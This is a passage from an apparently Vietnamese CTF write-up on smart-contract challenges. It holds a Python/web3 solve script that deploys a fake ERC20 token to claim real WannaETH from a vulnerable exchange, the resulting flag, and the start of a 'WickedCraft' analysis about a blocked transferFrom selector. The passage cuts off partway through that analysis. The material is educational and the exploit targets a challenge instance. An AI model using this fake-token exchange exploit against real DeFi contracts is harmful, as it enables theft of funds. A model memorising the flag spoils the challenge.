</span></span></span><span class="line"><span class="cl"><span class="s2">    mapping(address =&gt; uint256) public balanceOf;
</span></span></span><span class="line"><span class="cl"><span class="s2">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    constructor() {
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[msg.sender] = totalSupply;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function transfer(address to, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        require(balanceOf[msg.sender] &gt;= value, &#34;Balance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[msg.sender] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[to] += value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function approve(address spender, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        allowance[msg.sender][spender] = value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    function transferFrom(address from, address to, uint256 value) public returns (bool) {
</span></span></span><span class="line"><span class="cl"><span class="s2">        require(balanceOf[from] &gt;= value, &#34;Balance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        if (allowance[from][msg.sender] != type(uint256).max) {
</span></span></span><span class="line"><span class="cl"><span class="s2">            require(allowance[from][msg.sender] &gt;= value, &#34;Allowance&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">            allowance[from][msg.sender] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        }
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[from] -= value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        balanceOf[to] += value;
</span></span></span><span class="line"><span class="cl"><span class="s2">        return true;
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SETUP_ABI</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;exchange&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract Exchange&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;register&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">EXCHANGE_ABI</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;sender&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;asset&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint64&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;amount&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint64&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;exchangeToken&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;asset&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint64&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;amount&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint64&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deposit&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;claimReceivedWannaETH&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Connecting to </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT_NC</span><span class="si">}</span><span class="s2"> to retrieve FLAG...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT_NC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">30</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag:</span><span class="se">\n</span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">30</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Error getting flag: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Compiling FakeToken...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">install_solc</span><span class="p">(</span><span class="s1">&#39;0.8.20&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">compiled_sol</span> <span class="o">=</span> <span class="n">compile_source</span><span class="p">(</span><span class="n">FAKE_TOKEN_SRC</span><span class="p">,</span> <span class="n">solc_version</span><span class="o">=</span><span class="s1">&#39;0.8.20&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">contract_id</span><span class="p">,</span> <span class="n">contract_interface</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">compiled_sol</span><span class="o">.</span><span class="n">items</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">bytecode</span> <span class="o">=</span> <span class="n">contract_interface</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">abi</span> <span class="o">=</span> <span class="n">contract_interface</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">RPC_URL</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] RPC Connection failed.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">account</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">PRIVATE_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">player</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Player: </span><span class="si">{</span><span class="n">player</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">send_tx</span><span class="p">(</span><span class="n">tx_data</span><span class="p">,</span> <span class="n">to</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">2000000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">tx_data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">to</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">to</span>
</span></span><span class="line"><span class="cl">        <span class="n">signed</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">tx</span><span class="p">,</span> <span class="n">PRIVATE_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed</span><span class="o">.</span><span class="n">raw_transaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">setup</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">SETUP_ADDRESS</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">SETUP_ABI</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exchange_addr</span> <span class="o">=</span> <span class="n">setup</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">exchange</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exchange</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">exchange_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">EXCHANGE_ABI</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_token</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">bytecode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">reg_tx</span> <span class="o">=</span> <span class="n">setup</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">register</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_tx</span><span class="p">(</span><span class="n">reg_tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="n">to</span><span class="o">=</span><span class="n">SETUP_ADDRESS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Registered success!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">construct_txn</span> <span class="o">=</span> <span class="n">fake_token</span><span class="o">.</span><span class="n">constructor</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">signed</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">construct_txn</span><span class="p">,</span> <span class="n">PRIVATE_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed</span><span class="o">.</span><span class="n">raw_transaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_token_addr</span> <span class="o">=</span> <span class="n">receipt</span><span class="o">.</span><span class="n">contractAddress</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;FakeToken deployed at: </span><span class="si">{</span><span class="n">fake_token_addr</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fake_token_deployed</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">fake_token_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">approve_tx</span> <span class="o">=</span> <span class="n">fake_token_deployed</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">approve</span><span class="p">(</span><span class="n">exchange_addr</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_tx</span><span class="p">(</span><span class="n">approve_tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="n">to</span><span class="o">=</span><span class="n">fake_token_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">amount</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">exch_tx</span> <span class="o">=</span> <span class="n">exchange</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">exchangeToken</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="n">fake_token_addr</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">amount</span><span class="p">))</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_tx</span><span class="p">(</span><span class="n">exch_tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="n">to</span><span class="o">=</span><span class="n">exchange_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">dep_tx</span> <span class="o">=</span> <span class="n">exchange</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">deposit</span><span class="p">(</span><span class="n">fake_token_addr</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">amount</span><span class="p">))</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_tx</span><span class="p">(</span><span class="n">dep_tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="n">to</span><span class="o">=</span><span class="n">exchange_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">claim_tx</span> <span class="o">=</span> <span class="n">exchange</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">claimReceivedWannaETH</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="p">,</span> <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="p">),</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_tx</span><span class="p">(</span><span class="n">claim_tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="n">to</span><span class="o">=</span><span class="n">exchange_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">setup</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">isSolved</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_flag</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">solve</span><span class="p">()</span>
</span></span></code></pre></div><p><strong>Flag:</strong> <code>W1{here_FoR_YOu-The_freE3x_cH4LLeNgE-flAG66eb}</code></p>
<h2 id="wickedcraft">
<a class="header-anchor" href="#wickedcraft"></a>
WickedCraft
</h2><p>Hàm <code>isSolved()</code> trả về true khi số dư của contract WannaCoin phải lớn hơn 10.000 WC. Ban đầu, contract <code>Setup</code> nắm giữ 1.000.000 WC và ta phải chuyển số tiền này từ <code>Setup</code> về lại địa chỉ <code>WannaCoin</code>.</p>
<p>Trong file <code>Aggregator.sol</code>, hàm <code>executeCommandCall</code> có một đoạn kiểm tra chặn selector <code>0x23b872dd</code> (tương ứng với hàm transferFrom). Điều này nhằm ngăn chặn việc dùng <code>Aggregator</code> để rút tiền từ các ví đã approve cho nó.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sol" data-lang="sol"><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nf">executeCommandCall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">i</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">outputPtr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">outputOffsetPtr</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="k">private</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">nativeAmount</span><span class="p">;</span>
